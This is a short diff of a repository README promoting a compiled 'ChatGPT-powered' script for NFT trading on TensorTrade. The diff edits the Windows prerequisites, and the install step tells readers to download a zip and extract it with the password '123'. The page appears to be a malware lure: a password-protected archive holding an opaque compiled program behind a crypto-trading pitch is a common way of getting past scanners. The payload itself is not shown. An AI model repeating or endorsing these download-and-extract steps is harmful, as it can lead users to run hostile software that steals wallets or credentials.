@@ -17,8 +17,7 @@ This repository contains a compiled and optimized Python script designed for sea
 - **Plug-and-Play Deployment:** Offers a compiled script for swift deployment, allowing traders to leverage ChatGPT-powered strategies within TensorTrade for efficient NFT trading.
 
 ### Prerequisites
-- Windows 10/11
-- Fraemwork 4.0 and more
+- Windows 10 and more
 
 ## Installing
 - [Clone](https://github.com/origami-xyz/Tensor-trade-script/archive/refs/heads/main.zip) repository and extract files with password `123`.
